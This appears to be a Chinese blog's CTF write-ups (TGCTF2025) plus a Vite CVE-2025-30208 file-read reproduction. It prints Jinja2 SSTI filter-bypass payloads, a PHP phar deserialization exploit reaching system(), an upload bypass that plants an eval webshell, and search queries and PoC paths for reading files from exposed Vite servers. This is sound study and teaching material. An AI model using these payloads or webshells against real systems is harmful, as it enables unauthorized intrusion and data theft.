send_from_directory('static', 'file.html')\n\n    if not filename.replace('_', '').isalnum():\n        return jsonify({'error': '只允许字母和数字！'}), 400\n\n    if os.path.isfile(filename):\n        try:\n            with open(filename, 'r') as file:\n                content = file.read()\n            return content\n        except Exception as e:\n            return jsonify({'error': str(e)}), 500\n    else:\n        return jsonify({'error': '路径不存在或者路径非法'}), 404\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=80)\n\n```\n\n这里会将直面天命换成`{{}}`，所以我们传入\n\n```\n直面8*8天命\n```\n\n返回64\n\n先看看is_typable的要求，输出合规的字符\n\n```python\nimport string\ndef is_typable(char):\n    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace\n    return char in typable_chars\nif \"__main__\" == __name__:\n    letters = \"\"\n    for i in range(1,1000):\n        if is_typable(chr(i)):\n            letters += chr(i)+\" \"\n    print(letters)\n#   ! \" # $ % & ' ( ) * + , - . / 0 1 2 3 4 5 6 7 8 9 : ; < = > ? @ A B C D E F G H I J K L M N O P Q R S T U V W X Y Z [ \\ ] ^ _ ` a b c d e f g h i j k l m n o p q r s t u v w x y z { | } ~\n```\n\n再结合黑名单\n\n```\nblack_list = ['{', '}', 'popen', 'os', 'import', 'eval', '_', 'system', 'read', 'base', 'globals']\n```\n\n直接旁路注入就行，把内容外带\n\n```\nPOST：name=直面\"\"[request.args.a][request.args.b][request.args.c]()[132][request.args.d][request.args.e][request.args.f](request.args.g)[request.args.h]()天命\nGET：/jingu?a=__class__&b=__base__&c=__subclasses__&d=__init__&e=__globals__&f=popen&g=cat flag&h=read\n```\n\n![image-20250412114506602](../image/achieve/202411/TGCTF/image-20250412114506602.png)\n\n# **直面天命（复仇）**\n\n也是有一个hint，不过这里直接给了路由aazz，访问后直接拿到源码\n\n```python\nimport os\nimport string\nfrom flask import Flask, request, render_template_string, jsonify, send_from_directory\nfrom a.b.c.d.secret import secret_key\n\napp = Flask(__name__)\n\nblack_list=['lipsum','|','%','{','}','map','chr', 'value', 'get', \"url\", 'pop','include','popen','os','import','eval','_','system','read','base','globals','_.','set','application','getitem','request', '+', 'init', 'arg', 'config', 'app', 'self']\ndef waf(name):\n    for x in black_list:\n        if x in name.lower():\n            return True\n    return False\ndef is_typable(char):\n    # 定义可通过标准 QWERTY 键盘输入的字符集\n    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace\n    return char in typable_chars\n\n@app.route('/')\ndef home():\n    return send_from_directory('static', 'index.html')\n\n@app.route('/jingu', methods=['POST'])\ndef greet():\n    template1=\"\"\n    template2=\"\"\n    name = request.form.get('name')\n    template = f'{name}'\n    if waf(name):\n        template = '想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹\nImage'\n    else:\n        k=0\n        for i in name:\n            if is_typable(i):\n                continue\n            k=1\n            break\n        if k==1:\n            if not (secret_key[:2] in name and secret_key[2:]):\n                template = '连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧\n\n再去西行历练历练\n\nImage'\n                return render_template_string(template)\n            template1 = \"“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“{{}}”\n最后，如果你用了cat，就可以见到齐天大圣了\n\"\n            template= template.replace(\"天命\",\"{{\").replace(\"难违\",\"}}\")\n            template = template\n    if \"cat\" in template:\n        template2 = '\n或许你这只叫天命人的猴子，真的能做到？\n\nImage'\n    try:\n        return template1+render_template_string(template)+render_template_string(template2)\n    except Exception as e:\n        error_message = f\"500报错了，查询语句如下：\n{template}\"\n        return error_message, 400\n\n@app.route('/hint', methods=['GET'])\ndef hinter():\n    template=\"hint：\n有一个aazz路由，去那里看看吧，天命人!\"\n    return render_template_string(template)\n\n@app.route('/aazz', methods=['GET'])\ndef finder():\n    with open(__file__, 'r') as f:\n        source_code = f.read()\n    return f\"\n{source_code}\n\", 200, {'Content-Type': 'text/html; charset=utf-8'}\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=80)\n```\n\n这次不一样，得传入天命难违才能替换成`{{}}`\n\n```\n天命8*8难违//返回64\n```\n\n不过之前旁路注入的方法被过滤了，下滑线也被过滤了，尝试用编码绕过，可以用16进制编码也可以用unicode编码\n\n我这里用unicode编码\n\n```\n天命\"\"['\\u005f\\u005f\\u0063\\u006c\\u0061\\u0073\\u0073\\u005f\\u005f']['\\u005f\\u005f\\u0062\\u0061\\u0073\\u0065\\u005f\\u005f']['\\u005f\\u005f\\u0073\\u0075\\u0062\\u0063\\u006c\\u0061\\u0073\\u0073\\u0065\\u0073\\u005f\\u005f']()[132]['\\u005f\\u005f\\u0069\\u006e\\u0069\\u0074\\u005f\\u005f']['\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f']['\\u0070\\u006f\\u0070\\u0065\\u006e']('cat tgffff11111aaaagggggggg')['\\u0072\\u0065\\u0061\\u0064']()难违\n```\n\n# 什么文件上传？\n\n## #phar反序列化\n\n源码提示机器人，访问一下robots.txt拿到信息\n\n![image-20250412173553364](../image/achieve/202411/TGCTF/image-20250412173553364.png)\n\n有class.php,同时提示文件上传后缀是三个小写字母\n\n同时扫目录\n\n```\n[23:23:46] Scanning:\n[23:24:01] 403 -   548B - /assets/\n[23:24:01] 301 -   162B - /assets  ->  http://node2.tgctf.woooo.tech/assets/\n[23:24:04] 301 -   162B - /css  ->  http://node2.tgctf.woooo.tech/css/\n[23:24:09] 200 -    1KB - /index.php\n[23:24:17] 200 -   239B - /robots.txt\n[23:24:21] 200 -     0B - /upload.php\n[23:24:21] 301 -   162B - /uploads  ->  http://node2.tgctf.woooo.tech/uploads/\n[23:24:21] 403 -   548B - /uploads/\n```\n\n有文件上传的地方，然后还有反序列化，第一个想到的就是phar反序列化了\n\n访问/class.php\n\n```php\n<?php\n    highlight_file(__FILE__);\n    error_reporting(0);\n    function best64_decode($str)\n    {\n        return base64_decode(base64_decode(base64_decode(base64_decode(base64_decode($str)))));\n    }\n    class yesterday {\n        public $learn;\n        public $study=\"study\";\n        public $try;\n        public function __construct()\n        {\n            $this->learn = \"learn<br>\";\n        }\n        public function __destruct()\n        {\n            echo \"You studied hard yesterday.<br>\";\n            return $this->study->hard();\n        }\n    }\n    class today {\n        public $doing;\n        public $did;\n        public $done;\n        public function __construct(){\n            $this->did = \"What you did makes you outstanding.<br>\";\n        }\n        public function __call($arg1, $arg2)\n        {\n            $this->done = \"And what you've done has given you a choice.<br>\";\n            echo $this->done;\n            if(md5(md5($this->doing))==666){\n                return $this->doing();\n            }\n            else{\n                return $this->doing->better;\n            }\n        }\n    }\n    class tommoraw {\n        public $good;\n        public $bad;\n        public $soso;\n        public function __invoke(){\n            $this->good=\"You'll be good tommoraw!<br>\";\n            echo $this->good;\n        }\n        public function __get($arg1){\n            $this->bad=\"You'll be bad tommoraw!<br>\";\n        }\n\n    }\n    class future{\n        private $impossible=\"How can you get here?<br>\";\n        private $out;\n        private $no;\n        public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20;\n\n        public function __set($arg1, $arg2) {\n            if ($this->out->useful7) {\n                echo \"Seven is my lucky number<br>\";\n                system('whoami');\n            }\n        }\n        public function __toString(){\n            echo \"This is your future.<br>\";\n            system($_POST[\"wow\"]);\n            return \"win\";\n        }\n        public function __destruct(){\n            $this->no = \"no\";\n            return $this->no;\n        }\n    }\n    if (file_exists($_GET['filename'])){\n        echo \"Focus on the previous step!<br>\";\n    }\n    else{\n        $data=substr($_GET['filename'],0,-4);\n        unserialize(best64_decode($data));\n    }\n    // You learn yesterday, you choose today, can you get to your future?\n?>\n```\n\n反序列化，看看危险函数，在`future::__toString()`中有system函数和可控参数wow，那就把链子推一下\n\n```\nyesterday::__destruct()->today::__call()->future::__toString()\n```\n\n那我们写一下exp\n\n```php\n<?php\n//yesterday::__destruct()->today::__call()->future::__toString()\nclass yesterday{\n    public $learn;\n    public $study=\"study\";\n    public $try;\n}\nclass today{\n    public $doing;\n    public $did;\n    public $done;\n}\nclass future{\n    private $impossible=\"How can you get here?<br>\";\n    private $out;\n    private $no;\n}\n$a = new yesterday();\n$a -> study = new today();\n$a -> study -> doing = new future();\necho serialize($a);\n```\n\n然后加上生成phar文件的代码\n\n```php\n<?php\n//yesterday::__destruct()->today::__call()->future::__toString()\nclass yesterday{\n    public $learn;\n    public $study=\"study\";\n    public $try;\n}\nclass today{\n    public $doing;\n    public $did;\n    public $done;\n}\nclass future{\n    private $impossible=\"How can you get here?<br>\";\n    private $out;\n    private $no;\n}\n$a = new yesterday();\n$a -> study = new today();\n$a -> study -> doing = new future();\necho serialize($a);\n$phar = new Phar(\"phar.phar\");\n$phar -> startBuffering();\n$phar -> setStub(\"<?php __HALT_COMPILER(); ?>\");\n$phar -> setMetadata($a);\n$phar -> addFromString(\"test.txt\",\"test\");\n$phar -> stopBuffering();\n```\n\n然后我们需要解决第二个问题，就是什么后缀名能上传成功，先写个生成随机三个小写字母的脚本\n\n```\nimport random\nimport string\n\ndef generate_random_letters(length=3):\n    \"\"\"生成指定长度的随机小写字母字符串\"\"\"\n    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))\n\n# 生成随机字母\nrandom_letters = generate_random_letters()\n\n# 写入文本文件\nwith open('random_letters.txt', 'w', encoding='utf-8') as file:\n    file.write(random_letters)\n\nprint(f\"已生成随机字母: {random_letters} 并保存到 random_letters.txt\")\n```\n\n直接bp进行fuzz吧\n\n![image-20250416155050274](../image/achieve/202411/TGCTF/image-20250416155050274.png)\n\n![image-20250416155117851](../image/achieve/202411/TGCTF/image-20250416155117851.png)\n\natg后缀，那就把phar文件后缀改成atg后缀，然后我们需要注意我们怎么触发这个phar反序列化\n\n```php\nif (file_exists($_GET['filename'])){\n        echo \"Focus on the previous step!<br>\";\n    }\n```\n\n这里有file_exists函数，可以触发phar的反序列化，那么我们上传我们的phar文件，`phar://`协议流可被file_exists()函数直接触发，并且反序列化成功。\n\n![image-20250416155331737](../image/achieve/202411/TGCTF/image-20250416155331737.png)\n\n然后我们在class.php页面使用phar伪协议去读取文件触发反序列化\n\n![image-20250416155628025](../image/achieve/202411/TGCTF/image-20250416155628025.png)\n\n然后我们post传入wow进行RCE就行\n\n![image-20250416155652782](../image/achieve/202411/TGCTF/image-20250416155652782.png)\n\n```\nPOST /class.php?filename=phar://uploads/phar.atg HTTP/1.1\nHost: 127.0.0.1:50063\nCache-Control: max-age=0\nsec-ch-ua: \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"Windows\"\nAccept-Language: zh-CN,zh;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 12\n\nwow=cat /fl*\n```\n\n好像这一道题是有非预期的\n\n非预期解是base64_encode()五次，并且直接传参filename。\n\n```php\n<?php\n//yesterday::__destruct()->today::__call()->future::__toString()\nfunction best64_decode($str)\n{\n    return base64_encode(base64_encode(base64_encode(base64_encode(base64_encode($str)))));\n}\nclass yesterday{\n    public $learn;\n    public $study=\"study\";\n    public $try;\n}\nclass today{\n    public $doing;\n    public $did;\n    public $done;\n}\nclass future{\n    private $impossible=\"How can you get here?<br>\";\n    private $out;\n    private $no;\n}\n\n$a = new yesterday();\n$a -> study = new today();\n$a -> study -> doing = new future();\necho best64_decode(serialize($a));\n```\n\n因为题目中会对传入的filename进行一个截断四个字符，所以我们在末尾随便加上四个字符\n\n直接获取shell。然后wow用POST传参，就是一句话木马\n\n```\nPOST /class.php?filename=Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NrMUVTbUZXUlRWUFZHMXpNVlpYU1hsaVIyeFRUVlp3ZGxkVVNYZE5SMFpXVDBoa1QxSkhVbkZhVnpBMFpVWlJlV0pGZEd4aVZrcEtWbTB4TUdKR1ZYZGhlazVYVTBoQ01sUldWVFZqUms1eFVXMXNUbUpGY0haWGJGcFBVMnMxY2sxVVdtcFNSMUp4V2xjd05HVkdVWGxpUlhSb1RXdHNOVmxyYUZkWlYxWldZWHBPVjFOSVFqSlVWM00xWTBaT2RFMVhkRmhTYTJ3MFYxUkplRlp0UmxaUFdFWlZWa1p3YzFSVVFYZE5iRkpYVlcwMVQyRXllSFZWVnpCNFlURmtSMU5ZYUZwTmFrWlhWVlprUjFkRk1WbGFSMnhPVFVSVk1sZFdXbXRUTWsxNFkwWlNWRlpIVW5GYVZ6QTFUbFpTYzFWdVdtaFdhelZKVkRGU1QxTnNTWGRPVnpsYVlsZDRSRlJzWkVwbGJGcFlXa2RHVG1KR2JETlZNVlpyWWpKS1NGUnVVbGRWZW14U1ZXcENkMDVXVmtoaVJYQlBUV3MwTWxscVRtOVViRnBJVDFoQ1VsWlhVbWhVVm1SVFUxWmFkV0pIUmxaV1ZXOTVWMnRhYjFWdFJsWlBTR1JQVWtkU2NWcFhNRFZPUmxKV1ZXNWFhRlpWV2tsV01uQkhZVEZPUjFkcVZsaGlSVnBFV2taa1MwNVdUbFZhUmxab1lteEZNVmRVVG5ka2JWWnlUMWhDVkdKWVVtOVdha1pIWTBaU05sRlVRazlOYXpReVdXNXdRMVZIUmxaalNFcGFZV3RyZUZsclZuTmpWMUpHVDFaQ1RtVnJXVEpXUkVwM1ZHczFjbUpJVmxaaWJYaHpWbFJDY2sweFdraGpSRUpRVlZRd09RPT0=1111 HTTP/1.1\nHost: 127.0.0.1:58609\nCache-Control: max-age=0\nsec-ch-ua: \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"Windows\"\nAccept-Language: zh-CN,zh;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\n\nwow=whoami\n```\n\n![image-20250416160704415](../image/achieve/202411/TGCTF/image-20250416160704415.png)\n\n# **什么文件上传？（复仇）**\n\n打法是一样的，不过修复了上面的非预期，直接打就行，但是最后的flag并不在目录下而是在环境变量中\n\n![image-20250416161132437](../image/achieve/202411/TGCTF/image-20250416161132437.png)\n\n# **(ez)upload**\n\n这个题目当时打比赛的时候就一直卡着，用了方法都不得行，复现后重新做一下看看\n\n先扫描个目录看看有没有源码泄露\n\n```\n[18:48:19] Scanning:\n[18:48:38] 200 -   419B - /index.php\n[18:48:38] 200 -   419B - /index.php.bak\n[18:48:48] 200 -    30B - /upload.php\n[18:48:48] 403 -   548B - /uploads/\n[18:48:48] 301 -   162B - /uploads  ->  http://127.0.0.1/uploads/\n```\n\n只是发现了index的源码，没看到upload的源码，但是可以猜测一下bak后缀的upload文件的源码有没有\n\n结果还真有\n\n```php\n<?php\ndefine('UPLOAD_PATH', __DIR__ . '/uploads/');\n$is_upload = false;\n$msg = null;\n$status_code = 200; // 默认状态码为 200\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\"php\", \"php5\", \"php4\", \"php3\", \"php2\", \"html\", \"htm\", \"phtml\", \"pht\", \"jsp\", \"jspa\", \"jspx\", \"jsw\", \"jsv\", \"jspf\", \"jtml\", \"asp\", \"aspx\", \"asa\", \"asax\", \"ascx\", \"ashx\", \"asmx\", \"cer\", \"swf\", \"htaccess\");\n\n        if (isset($_GET['name'])) {//检查name参数是否存在\n            $file_name = $_GET['name'];\n        } else {\n            $file_name = basename($_FILES['name']['name']);//不存在则提取原始文件名\n        }\n        $file_ext = pathinfo($file_name, PATHINFO_EXTENSION);//使用pathinfo提取文件名扩展名，PATHINFO_EXTENSION 是常量，表示只返回扩展名部分。\n\n        if (!in_array($file_ext, $deny_ext)) {//检查文件扩展名 $file_ext 是否不在黑名单 $deny_ext\n            $temp_file = $_FILES['name']['tmp_name'];//$temp_file 获取上传文件的临时存储路径\n            $file_content = file_get_contents($temp_file);//读取临时文件的全部内容到 $file_content。\n正则表达式有误，应该是 /<.+?>/s才对\n                $msg = '文件内容包含非法字符，禁止上传！';\n                $status_code = 403; // 403 表示禁止访问\n            } else {//移动文件到指定目录下\n                $img_path = UPLOAD_PATH . $file_name;\n                if (move_uploaded_file($temp_file, $img_path)) {\n                    $is_upload = true;\n                    $msg = '文件上传成功！';\n                } else {\n                    $msg = '上传出错！';\n                    $status_code = 500; // 500 表示服务器内部错误\n                }\n            }\n        } else {\n            $msg = '禁止保存为该类型文件！';\n            $status_code = 403; // 403 表示禁止访问\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n        $status_code = 404; // 404 表示资源未找到\n    }\n}\n\n// 设置 HTTP 状态码\nhttp_response_code($status_code);\n\n// 输出结果\necho json_encode([\n    'status_code' => $status_code,\n    'msg' => $msg,\n]);\n```\n\n## pathinfo漏洞\n\n我们重点关注一下移动文件的操作\n\n```php\n$img_path = UPLOAD_PATH . $file_name;\nmove_uploaded_file($temp_file, $img_path)\n```\n\n这里的话会将文件从临时存储目录移动到指定目录，并把文件名保存给file_name参数，也就是我们get传入的name值\n\n我们这里是一定要进行get传参name的，因为这里有\n\n```\n$file_name = basename($_FILES['name']['name']);\n```\n\n如果不传入name参数就会按照原始文件名处理\n\n然后我们这里可以关注到，在检测黑名单后缀名的时候是有一个pathinfo()函数的，这个函数我之前看到是有一个漏洞的，例如`1.php\\.`的话这里会因为pathinfo()检测机制问题导致pathinfo函数返回后缀名（最后一个点号后面的字符串）的时候会去除 / 和 \\ 。然后导致该函数返回值为空，从而1.php可以成功绕过后缀名\n\n我们还需要关注到这里在检测后缀名之后就会有move_uploaded_file($temp_file, $img_path)的操作\n\n然后我翻找到一篇文章\n\n参考文章：[从0CTF一道题看move_uploaded_file的一个细节问题](https://www.anquanke.com/post/id/103784)\n\n所以在进行目录跳转后这个函数的判断就出问题或者说失效了，可以实现文件覆盖，再结合我们之前分析的内容，最终的payload就是\n\n```\nPOST /upload.php?name=a/../2.php/. HTTP/1.1\nHost: 127.0.0.1:59393\nContent-Length: 316\nCache-Control: max-age=0\nsec-ch-ua: \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"Windows\"\nAccept-Language: zh-CN,zh;q=0.9\nOrigin: http://127.0.0.1:59393\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary4E5cFglyBvxrlbmU\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: http://127.0.0.1:59393/\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\n\n------WebKitFormBoundary4E5cFglyBvxrlbmU\nContent-Disposition: form-data; name=\"name\"; filename=\"shell.png\"\nContent-Type: text/plain\n\n<?php eval($_POST['cmd']);?>\n------WebKitFormBoundary4E5cFglyBvxrlbmU\nContent-Disposition: form-data; name=\"submit\"\n\n上传文件\n------WebKitFormBoundary4E5cFglyBvxrlbmU--\n\n```\n\n之前做了目录的探测，文件会保存至uploads的文件目录下，发包后我们访问/uploads/2.php，页面空白说明马写进去了，执行rce试一下\n\n![image-20250416193859687](../image/achieve/202411/TGCTF/image-20250416193859687.png)\n\n成功执行，所以我们写马成功了，flag在环境变量中\n\n但是上面其实是为了进行文件覆盖才这样打，例如这里本来是没有1.php的，所以可以直接打`1.php/.`\n\n```\nPOST /upload.php?name=1.php/. HTTP/1.1\nHost: 127.0.0.1:53357\nContent-Length: 313\nCache-Control: max-age=0\nsec-ch-ua: \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"Windows\"\nAccept-Language: zh-CN,zh;q=0.9\nOrigin: http://127.0.0.1:53357\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryksZafED3oB2uRSSt\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: http://127.0.0.1:53357/\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\n\n------WebKitFormBoundaryksZafED3oB2uRSSt\nContent-Disposition: form-data; name=\"name\"; filename=\"1.png\"\nContent-Type: text/plain\n\n<?php eval($_POST['cmd']); ?>\n------WebKitFormBoundaryksZafED3oB2uRSSt\nContent-Disposition: form-data; name=\"submit\"\n\n上传文件\n------WebKitFormBoundaryksZafED3oB2uRSSt--\n\n```\n\n并且这个目录我们是可控的，例如我们传如`../1.php/.`的话，文件是会保存到跟uploads同级目录下的\n","tags":["TGCTF2025"],"categories":["赛题wp"]},{"title":"Vite任意文件读取漏洞","url":"/2025/04/14/Vite任意文件读取漏洞/","content":"\n参考文章：[Vite开发服务器任意文件读取漏洞(CVE-2025-30208)](Vite开发服务器任意文件读取漏洞(CVE-2025-30208))\n\n# 搜索语句\n\n```\nFofa:body=\"/@vite/client\"\nHunter:web.body=\"/@vite/client\"\n```\n\n![image-20250415113804108](../image/achieve/202411/CVE复现/image-20250415113804108.png)\n\n# CVE-2025-30208\n\n## 0x01漏洞描述\n\nVite 是一款现代化的前端开发构建工具，它提供了快速的开发服务器和高效的构建能力，广泛应用于 Vue.js 项目的开发过程中。\n\n- 漏洞原理\n\n由于 Vite 开发服务器在处理特定 URL 请求时，没有对请求的路径进行严格的安全检查和限制，导致攻击者可以绕过保护机制，非法访问项目根目录外的敏感文件。攻击者只需在浏览器输入一个 URL，就可能会造成源码、SSH密钥、数据库账号、用户数据等目标机器上的任意文件信息泄露。\n\n- 漏洞影响版本\n\n目前受影响的NextJS版本：\n6.2.0 <= Vite <= 6.2.2\n\n6.1.0 <= Vite <= 6.1.1\n\n6.0.0 <= Vite <= 6.0.11\n\n5.0.0 <= Vite <= 5.4.14\n\nVite <= 4.5.9\n\n## 0x02漏洞成因\n\n**Vite开发服务器有提供一种`@fs`机制，这种机制可以用于限制访问，以防止访问Vite允许列表之外的文件**，即`@fs`拒绝访问 Vite 服务允许列表之外的文件。在 URL 中添加`?raw??`或`?import&raw??`可以绕过此限制，并返回文件内容（如果存在）。之所以存在这种绕过，是因为`?`在多个位置，诸如 之类的尾部分隔符会被删除，但在查询字符串正则表达式中却没有考虑到这一点。\n\n## 0x03环境搭建(linux下)\n\n**使用create-vite包**\n\n`create-vite`是一个项目脚手架工具，其核心功能是帮助开发者快速搭建基于 Vite 的项目初始结构。\n\n```\nnpm create vite@latest my-project -y -- --template vue-ts\ncd my-project\ngrep \"\\\"vite\\\":\" package.json#会得到\"vite\": \"^6.2.0\"，把^去掉\nnpm install\nnpm run dev\n```\n\n一开始一直都失败，后面更新了一下node.js的版本，因为我是外部IP访问的这个，所以还得把地址改一下\n\n```js\n//在 vite.config.js 中配置\nimport { defineConfig } from 'vite'\nimport vue from '@vitejs/plugin-vue'\n\nexport default defineConfig({\n  plugins: [vue()],\n  server: {\n    host: '0.0.0.0', // 监听所有网络接口（默认是 127.0.0.1 仅本地访问）\n    port: 5173,      // 指定端口（默认 5173）\n    open: true       // 启动时自动打开浏览器（可选）\n  }\n})\n\n```\n\n![image-20250414172350488](../image/achieve/202411/CVE复现/image-20250414172350488.png)\n\n搭建环境成功\n\n我们先看一下`@fs`的配置\n\n在 Vite 的配置中，`server.fs.allow` 选项通常位于 **`vite.config.js`** 或 **`vite.config.ts`** 文件中\n\n在 Vite 服务器的 URL 处理逻辑中，`@fs` 机制原本用于限制对非白名单目录的访问，例如有\n\n```\nexport default defineConfig({\n  server: {\n    fs: {\n      // Allow serving files from one level up to the project root\n      allow: [path.resolve(__dirname, 'src')],\n    },\n  },\n})\n```\n\n解释一下代码：\n\n- **`server.fs.allow`**：Vite 的 **文件系统访问白名单**，默认只允许访问 **项目根目录**。\n- `path.resolve(__dirname, 'src')`\n  - `__dirname`：当前配置文件所在的目录（通常是项目根目录）。\n  - `path.resolve()`：解析出 `src` 目录的 **绝对路径**（如 `/Users/yourname/project/src`）。\n- **`['src']`**：表示只允许 Vite 访问 `src` 目录及其子目录。\n\n看看官方文档中的解释\n\n![image-20250414191851121](../image/achieve/202411/CVE复现/image-20250414191851121.png)\n\n翻译一下第一段话意思就是限制可以通过/@fs/提供的文件。当server.fs.strict设置为true时，访问此目录列表之外的文件（这些文件不是从允许的文件导入的）将导致403。\n\n例如我们如果直接访问其他目录是无效的\n\n![image-20250414192210485](../image/achieve/202411/CVE复现/image-20250414192210485.png)\n\n但是访问src目录下的文件是可以的\n\n![image-20250414192401858](../image/achieve/202411/CVE复现/image-20250414192401858.png)\n\n然后我们的漏洞点在哪呢？Vite 在 URL 解析过程中会移除部分特殊字符，而未正确考虑查询参数的影响，导致攻击者可以构造特别的请求能绕过安全检查\n\n然后我们看一下V6.2.0的源码找一下漏洞点\n\n### 分析源码\n\n首先是在`\\vite-create-vite-6.2.0\\packages\\vite\\src\\node\\server\\middlewares\\transform.ts`文件中有URL处理的一段代码\n\n![image-20250415085926446](../image/achieve/202411/CVE复现/image-20250415085926446.png)\n\n有一个removeTimestampQuery函数，跟进看一下\n\n```js\nexport function removeTimestampQuery(url: string): string {\n  return url.replace(timestampRE, '').replace(trailingSeparatorRE, '')\n}\n```\n\n后面的replace就不说了，就是处理空字节占位符\n\n然后这里有两个正则匹配\n\n```\nconst timestampRE = /\\bt=\\d{13}&?\\b/\nconst trailingSeparatorRE = /[?&]$/\n```\n\n- 第一个是为了处理时间戳参数\n- 第二个是检测 URL 末尾是否有多余的 **查询参数分隔符**（`?` 或 `&`），用于清理无效的 URL 格式。\n\n这里是URL处理的一部分，我们继续往下分析\n\n![image-20250415090637451](../image/achieve/202411/CVE复现/image-20250415090637451.png)\n\n```javascript\n      if (\n        (rawRE.test(url) || urlRE.test(url)) &&\n        !ensureServingAccess(url, server, res, next)\n      ) {\n        return\n      }\n```\n\n这段代码是 **Vite 开发服务器** 中用于 **检查文件访问权限的核心逻辑**，主要目的是 **防止未经授权的文件系统访问**。\n\n有两个正则匹配\n\n```\nexport const urlRE = /(\\?|&)url(?:&|$)/\nexport const rawRE = /(\\?|&)raw(?:&|$)/\n```\n\n- 匹配 URL 中的 **`url` 查询参数**（如 `?url` 或 `&url`），通常用于 **动态资源请求** 或 **代理转发**。\n- 匹配 URL 中的 **`raw` 查询参数**（如 `?raw` 或 `&raw`），通常用于 **强制返回原始文件内容**\n\n在官方文档中url和raw的作用是什么呢？\n\n![image-20250415100452791](../image/achieve/202411/CVE复现/image-20250415100452791.png)\n\n![image-20250415100438951](../image/achieve/202411/CVE复现/image-20250415100438951.png)\n\n例如我们的poc\n\n```\nrawRE.test(\"/@fs/C://windows/win.ini?import&raw?\")\n```\n\n为什么这里没有匹配上rawRE的正则匹配呢？因为 `raw` 后必须接 `&` 或字符串结束。这里在结尾用?号的话能绕过这个匹配让`urlRE.test(url)`为false。例如我们传入\n\n```\n/@fs/etc/passwd?import&raw\n```\n\n此时是匹配上的，所以无法返回文件内容\n\n至于urlRE的匹配，本身poc里就没有url参数，自然而然就不匹配了\n\n再看官方的修复对比v6.2.2和v6.2.3：增加了一条正则进行匹配，这段正则专门匹配URL 末尾是否有多余的查询参数分隔符（`?` 或 `&`）从而修复了该问题，但是也迎来了另一个绕过方式，也就是`CVE-2025-31125`，这个我们下面再讲\n\n**权限校验（ensureServingAccess）**\n\n我们先跟踪一下源码\n\n```js\nexport function ensureServingAccess(\n  url: string,\n  server: ViteDevServer,\n  res: ServerResponse,\n  next: Connect.NextFunction,\n): boolean {\n  if (isFileServingAllowed(url, server)) {\n    return true\n  }\n  if (isFileReadable(cleanUrl(url))) {\n    const urlMessage = `The request url \"${url}\" is outside of Vite serving allow list.`\n    const hintMessage = `\n${server.config.server.fs.allow.map((i) => `- ${i}`).join('\\n')}\n\nRefer to docs https://vite.dev/config/server-options.html#server-fs-allow for configurations and more details.`\n\n    server.config.logger.error(urlMessage)\n    server.config.logger.warnOnce(hintMessage + '\\n')\n    res.statusCode = 403\n    res.write(renderRestrictedErrorHTML(urlMessage + 